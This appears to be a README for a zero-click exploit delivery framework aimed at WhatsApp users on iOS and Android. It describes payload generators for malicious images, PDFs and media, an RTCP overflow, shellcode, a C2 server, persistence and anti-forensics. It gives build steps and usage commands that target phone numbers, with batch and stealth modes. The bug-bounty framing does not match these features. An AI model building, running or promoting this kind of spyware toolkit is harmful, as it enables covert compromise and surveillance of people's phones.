# Graphite-class Operational Framework

Zero-click exploit delivery framework for security research and HackerOne bug bounty.

## Components

### Python (Operational Chain)
- `graphite.py` — Unified entry point (v2.0)

## Project layout
- `tests/` — verification scripts and fixtures
- `docs/` — research report
- `payloads/` — generated payload binaries
- `scripts/` — build helpers
- `framework/cpp/bin/` — compiled native artifacts
- `operational_framework.py` — Core framework (recon, fingerprint, deliver, track)
- `poc_device_fingerprinting.py` — Device fingerprinting engine
- `poc_live_fetch.py` — Live prekey fetch via pywhats
- `poc_payloads.py` — Payload builders (RTCP, MP4, PTT, WEBP)
- `dng_payload.py` — DNG generator (CVE-2025-43300 trigger)
- `pdf_payload.py` — Malicious PDF generator (WhatsApp delivery)
- `voip_handler.py` — VoIP call handler + RTCP injection
- `c2_module.py` — C2 channel, persistence, anti-forensics
- `c2_server.py` — C2 server (Flask-based)

### Native (Compiled Exploit Components)
- `framework/rust/` — Primary core (Rust cdylib: fingerprint, RTCP, DNG, PDF, MP4, PTT, WEBP, shellcode)
- `framework/cpp/` — C/C++ core + RTCP overflow (legacy C DLL backed up as graphite_core_c_backup.dll)
- `framework/ios/` — iOS native (Objective-C/Swift, Xcode)
- `framework/android/` — Android (Java + NDK C++)

### CI/CD
- `.github/workflows/build.yml` — GitHub Actions (C++, iOS, Android, Python)

## Build

### Python
```bash
pip install pywhats
python graphite.py --session <path> --target <jid> --platform iOS
```

### C++
```bash
cd framework/cpp
g++ -std=c++17 -O2 -o rtcp_exploit rtcp_exploit.cpp
./rtcp_exploit
```

### Java
```bash
cd framework/android
javac GraphiteExploit.java
java GraphiteExploit
```

### iOS (Xcode/macOS)
```bash
cd framework/ios
xcodebuild -project GraphiteExploit.xcodeproj -scheme GraphiteExploit -sdk iphoneos build
```

### Android (NDK)
```bash
cd framework/android
mkdir build && cd build
cmake .. -DCMAKE_TOOLCHAIN_FILE=$ANDROID_NDK/build/cmake/android.toolchain.cmake -DANDROID_ABI=arm64-v8a
make
```

## Usage

### Reconnaissance only
```bash
python graphite.py --session device.json --target 15551234567 --platform iOS --recon-only
```

### Full operational chain
```bash
python graphite.py --session device.json --target 15551234567 --platform iOS --ios-version 17
```

### Batch mode
```bash
python graphite.py --session device.json --targets-file targets.json --batch
```

### Stealth mode
```bash
python graphite.py --session device.json --target 15551234567 --stealth
```

### C2 Server
```bash
python c2_server.py --host 0.0.0.0 --port 8443
```

## Requirements
- Python 3.11+ with pywhats
- Java JDK 17+ (for Android components)
- C++ compiler (g++/clang/MSVC)
- Xcode 15+ (for iOS, macOS only)
- Android NDK r26+ (for Android native)
- GitHub Actions (for CI/CD compilation)
